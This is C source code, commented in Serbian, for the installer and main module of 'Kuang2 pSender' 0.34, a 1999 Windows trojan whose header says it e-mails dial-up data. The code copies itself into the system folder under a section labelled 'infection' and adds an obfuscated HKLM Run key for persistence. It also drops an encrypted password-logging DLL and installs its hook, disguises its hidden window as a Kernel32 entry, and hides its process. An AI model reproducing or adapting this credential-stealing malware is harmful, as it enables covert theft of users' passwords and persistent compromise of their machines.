/***[ThuNderSoft]*************************************************************
				  KAUNG2 pSender: Ñalje DUP podatke na e-mail
								   ver: 0.34
								˙˘ƒÕ WEIRD Õƒ˘˙
*****************************************************************************/

/* HISTORY */
// >>>>> RELEASE VERSION: 0.34 (19-may-1999) <<<<<
// ver 0.34 (19-may-1999): ispravljeni bugovi i DLL je sada pametniji
// >>>>> RELEASE VERSION: 0.30 (04-mar-1999) <<<<<
// ver 0.30 (02-mar-1999): getfilename bug je ispravljen
// ver 0.27 (26-feb-1999): slanje na email
// ver 0.23 (20-feb-1999): ubaÅen DLL i negovo kreiranje i startovanje hooka
// ver 0.18 (15-feb-1999): born code

#include <windows.h>
#include <ctypew.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

#pragma aux Wmain "_*"

// Maximalna duÇina imena fajla, poÑto se na osnovu njega kreiraju
// razna druga imena
#define MAX_FILENAMELEN		31

// Ove stvari se moraju same odrediti kako bi se ubrzao proces instalranja
// Svaki put ih aÇuriraj kada se menja dll!
#define		DLL_SIZE		5632
#define		DL_NAME_OFS		0x1000

char compname[MAX_COMPUTERNAME_LENGTH+1];	// ime kompjutera
char sysfile[MAX_PATH+1];					// ime fajla koje beleÇi podatke
char appname[MAX_PATH+1];					// ime exe fajla koje Üe biti ubaÅeno u Registry
char dllname[MAX_PATH+1];					// ime dll-a koji Üe biti stvoren
char dl_name[MAX_PATH+1];					// ime fajla za dll-a koji pamti passworde

char psWndName[MAX_FILENAMELEN]="Kernel32#";     // ime nevidljivog pSender prozora
char psClassName[MAX_FILENAMELEN]="Krnl_class."; // ime pSender klase
char regdataname[MAX_FILENAMELEN];

static char regstartup[]={		// "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	0x35, 0xF4, 0x64, 0x45, 0x75, 0x14, 0x25, 0x54, 0xC5, 0xD4, 0x96, 0x36,\
	0x27, 0xF6, 0x37, 0xF6, 0x66, 0x47, 0xC5, 0x75, 0x96, 0xE6, 0x46, 0xF6,\
	0x77, 0x37, 0xC5, 0x34, 0x57, 0x27, 0x27, 0x56, 0xE6, 0x47, 0x65, 0x56,\
	0x27, 0x37, 0x96, 0xF6, 0xE6, 0xC5, 0x25, 0x57, 0xE6, 0x00};


extern LRESULT CALLBACK WndProc (HWND, unsigned int, WPARAM, LPARAM);

#include "passdll.c"

void (*InstallHook) (void);
void (*UnHook) (void);
HINSTANCE hdll;
HWND hwndW;

/*
	InitApp
	-------
  ˛ Inicijalizacija aplikacije. WinMain mora prvo nju da pozove.
  ˛ Registruje se windows klasa za aplikaciju. Kreira se glavni prozor. */

BOOL InitApp(HINSTANCE hInst)
{
	WNDCLASSEX wc;

	/* DefiniÑemo parametre klase */

	wc.cbSize		 = sizeof(WNDCLASSEX);			// veliÅina strukture
	wc.style		 = 0;							// nema stilova klase
	wc.lpfnWndProc	 = (WNDPROC) WndProc;			// message loop procedura
	wc.cbClsExtra	 = 0;							// nema etxra data po klasi
	wc.cbWndExtra	 = 0;							// nema extra data po prozoru
	wc.hInstance	 = hInst;						// ko poseduje ovu klasu (owner)
	wc.hIcon		 = NULL;						// nema ikona (RC)
	wc.hCursor		 = NULL;						// nema kurzora (RC)
	wc.hbrBackground = NULL;						// nema default boja
	wc.lpszMenuName	 = NULL;						// nema meni (RC)
	wc.lpszClassName = psClassName;					// ime za registraciju klase
	wc.hIconSm		 = NULL;						// nema male ikona

	if (!RegisterClassEx(&wc))	// Registracija klase
		if (!RegisterClass((LPWNDCLASS)&wc.style))
			return FALSE;

	hwndW = CreateWindow(					// kreiramo glavni prozor aplikacije
			psClassName,					// ime registrovane klase
			psWndName,						// text za Title bar - da bi ga pronaÑao
			0,								// windows stil
			-1, -1, 0, 0,					// pozicija i veliÅina
			NULL,							// prethodni hwnd
			NULL,							// handle za meni ili child-prozor
			hInst,							// ova instanca poseduje (own) prozor
			NULL							// Don't need data in WM_CREATE
		);

	if (!hwndW) return FALSE;	// ako prozor nije mogao da se kreira vrati FALSE

	ShowWindow(hwndW, SW_HIDE); // javi Windowsu za prozor i sakrij ga - ovo daje WM_CREATE poruku!
	return TRUE;				// sve je proÑlo dobro, blago meni

}


/*
	WinMain
	--------
  ˛ poÅinjemo, ali na Weird naÅin :) */

int Wmain()
{
	HWND hThisInst;					// handle -> ova instanca
	MSG msg;						// potrebno za MessageLoop
	HANDLE hFout;					// handle za fajl
	char *CmdLine;					// komandna linija
	int i;							// pomoÜna varijabla
	WSADATA W;						// za WSAStartup

	LONG lRv;						// registry
	HKEY hKey;						// registry
	DWORD dwDisposition;			// registry

	DWORD maxcname = MAX_COMPUTERNAME_LENGTH + 1;	// max duÇina cname

/***************************************************************************
								  instalacija
****************************************************************************/

	// preuzmi handle ove aplikacije
	hThisInst=GetModuleHandle(NULL);

	// preuzmi komandnu liniju
	CmdLine=GetCommandLine();
	CmdLine=StripCmdline(CmdLine);	// oslobodi se znakova navoda

	/* Inicijalizacija imena */
	GetSystemDirectory(sysfile, MAX_PATH);		// pokupi ime WinSystem foldera
	strcopyFaddc(appname, sysfile, '\\');
	strcopyF(sysfile, appname);
	strcopyF(regdataname, getfilename(CmdLine));// kopiraj samo ime u regdata
	setfileext(regdataname, "exe");             // postavi exe extenziju u sluÅaju da je neka druga
	i=strlengthF(regdataname)-1;
	while(i) {regdataname[i]=_to_lower(regdataname[i]); i--;}	// konvertuj sva slova u mala osim prvog!
	straddF(sysfile, regdataname);
	straddF(appname, regdataname);				// ime za instalaciju
	stripfileext(regdataname);					// izbaci extenziju
	straddF(psWndName, regdataname);			// ime prozora
	straddF(psClassName, regdataname);			// ime klase
	strcopyF(dllname, sysfile);
	strcopyF(dl_name, sysfile);
	setfileext(sysfile, "cfg");                 // ime fajla koji pamti DUN podatke
	setfileext(dllname, "dll");                 // ime dll fajla
	setfileext(dl_name, "dl_");                 // ime fajla za dll koji pamti
	setfileext(regdataname, "task");            // 'extenzija' za regdata
	strdecryptS(regstartup);					// dekriptuj

	// Prvo proveravamo da li je ova aplikacija veÜ aktivna
	if (FindWindow(NULL, psWndName)) return 0;	// ako jeste, izaîi

	i=0;
	// probaj da ga otvoriÑ <ime>.exe
	hFout=CreateFile(appname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFout==INVALID_HANDLE_VALUE) {			// ako <ime>.exe ne postoji
		// ako smo ovde znaÅi da Kuang2 pSender nije instaliran na sistem
		/*** INFEKCIJA ***/
		if (CopyFile(CmdLine, appname, FALSE)) {	// kopiraj ga u system folder

			// otvori key u registryju
			lRv = RegOpenKeyEx(HKEY_LOCAL_MACHINE, regstartup, 0, KEY_ALL_ACCESS, &hKey);

			if (lRv != ERROR_SUCCESS)		// key nije u registry? - moramo da ga napravimo (+win97)
				lRv=RegCreateKeyEx(HKEY_LOCAL_MACHINE, regstartup, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);

			if (lRv != ERROR_SUCCESS) {
				return 3;	// neka greÑka i dalje
			}

			// setuj value
			i=strlengthF(appname)+1;
			RegSetValueEx(hKey, regdataname, 0, REG_SZ, appname, i);

			RegCloseKey(hKey);		// zavrÑi zezanje sa registryjom
		}
	} else CloseHandle(hFout);		// zatvori fajl


	// proveri da li postoji DLL
#define		upisano		dwDisposition
	hFout=CreateFile(dllname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFout==INVALID_HANDLE_VALUE){		// ako <ime>.dll ne postoji
		hFout=CreateFile(dllname, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFout!=INVALID_HANDLE_VALUE) {
			/* Formiraj DLL */
			rdecrypt(data_passdll, data_passdll);			// dekriptuj
			strcopyF(&data_passdll[DL_NAME_OFS], dl_name);	// upiÑi ime fajla u koji Üe se zapisivati
			WriteFile(hFout, data_passdll, DLL_SIZE, &upisano, NULL);	// upiÑi u dll
			CloseHandle(hFout);
		}
	} else CloseHandle(hFout);


	if (i) return 0;	// ako smo inficirali onda izaîi da bi
						// oslobodili trenutni exe da moÇe da se
						// obriÑe.

/***************************************************************************
							ukljuÅujemo nadgledanje
****************************************************************************/

	// sakrivamo ovaj proces
	HideProcess(TRUE);

	// zahtev za WinSock v1.1
	if (WSAStartup (0x101, &W)) return 1;

	GetComputerName(compname, &maxcname);		// pokupi ime kompjutera

	/* Inicijalizacija hook-a */
	hdll=LoadLibrary(dllname);
	if (hdll) {
		InstallHook=(void (*)(void )) GetProcAddress(hdll, "GetSystemDescriptor_");
		UnHook=(void (*)(void )) GetProcAddress(hdll, "FlushCache_");
	}

	/* Inicijalizacija programa */
	if (!InitApp(hThisInst)) return 2;

	/* Message Loop */
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// ubij prozor
	DestroyWindow(hwndW);

	// oslobodi hook
	if (hdll) FreeLibrary(dllname);

	// oslobodi WinSock
	WSACleanup();

	return msg.wParam;			// vraÜa vrednost od PostQuitMessage
}
